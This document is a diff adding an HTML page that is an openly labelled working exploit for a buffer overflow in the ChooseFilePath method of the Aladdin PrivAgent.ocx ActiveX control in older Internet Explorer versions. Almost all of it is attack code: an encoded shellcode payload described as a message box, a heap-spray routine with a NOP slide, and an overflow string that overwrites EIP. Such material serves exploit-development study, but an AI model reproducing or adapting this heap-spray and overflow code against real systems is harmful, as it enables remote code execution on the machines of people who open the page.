@@ -1,0 +1,48 @@
+<!---------------------------------------------------------------------------
+| Exploit: Aladdin Knowledge System Ltd - PrivAgent.ocx ChooseFilePath BOF  |
+| Author: b33f - http://www.fuzzysecurity.com/                              |
+| OS: Tested on XP PRO SP3                                                  |
+| Browser: IE 4.01, IE 5.01, IE 6.00, IE 7.00                               |
+| POC - shinnai: http://www.exploit-db.com/exploits/22258/                  |
+---------------------------------------------------------------------------->
+
+<html>
+  <head>
+  	<object id="pwnd" classid="clsid:09F68A41-2FBE-11D3-8C9D-0008C7D901B6"></object>
+  </head>
+  <body>
+  <script>
+
+	//Messagebox (js_le)
+	var MessageBox = unescape(
+	'%ue9be%uac66%udb2b%ud9c2%u2474%u58f4%uc931%u3fb1%uc083%u3104%u1070%u7003%u0b10'+
+	'%u7593%u50c0%uf285%u9233%u2907%u2d89%u0459%u5a8a%ua6e8%u2ad8%u4c07%ucea8%u149c'+
+	'%u655d%ub8dc%u4fd6%uf619%udaf0%u51aa%uf500%u83b2%u7e62%u6020%u0b47%u54fc%u5f0c'+
+	'%udcd7%ub513%u57ac%uc20c%u47e9%u3f2d%ubcee%u3464%u37c5%ua477%ub717%uf849%ueba4'+
+	'%u382e%uf320%u77ef%ufac4%u6c28%uc723%u56ca%u4de4%u1dd2%u89ae%uca15%u5929%u4719'+
+	'%u073d%u563e%u33aa%ud33a%uac2d%ua7ca%u3009%ue4ac%u40e0%u3e07%ub48d%u7cde%ub8e6'+
+	'%u8eaf%u961b%u11c7%ue81c%ua4e7%u13a6%uc8a3%ufef0%ub3a0%udb1d%u5314%udc93%u5c66'+
+	'%u6725%uca91%u045a%u4b81%ue7cb%u65f3%u606f%u0a81%u020a%ub0e1%ue8f0%uae78%u13af'+
+	'%u2a2f%u2ed9%u8980%u0c71%u516c%u4d06%ufb4b%u0fe1%u046c%ua70e%udaca%u18d1%u7883'+
+	'%u6a21%u4d35%u049e%u89e5%u9c24%ub9f5%uc605%u19d9%ua62e%u174e%u77ea%u2fb8%u53be'+
+	'%ua63f%uadde%ueaed%u9f73%uf543%u2ea4%u59a4%u04ba%u412c');
+	
+	//Spray spray spray
+	var NopSlide = unescape('%u9090%u9090');
+	var headersize = 20;
+	var slack = headersize + MessageBox.length;
+	while (NopSlide.length < slack) NopSlide += NopSlide;
+	var filler = NopSlide.substring(0,slack);
+	var chunk = NopSlide.substring(0,NopSlide.length - slack);
+	while (chunk.length + slack < 0x40000) chunk = chunk + chunk + filler;
+	var memory = new Array();
+	for (i = 0; i < 500; i++){ memory[i] = chunk + MessageBox }
+
+	//EIP => 0x06060606
+	junk='';
+	for( counter=0; counter<=268; counter++) junk+=unescape("%41");
+	pwnd.ChooseFilePath(junk + "\x06\x06\x06\x06"); 
+
+  </script>
+</body>
+</html>
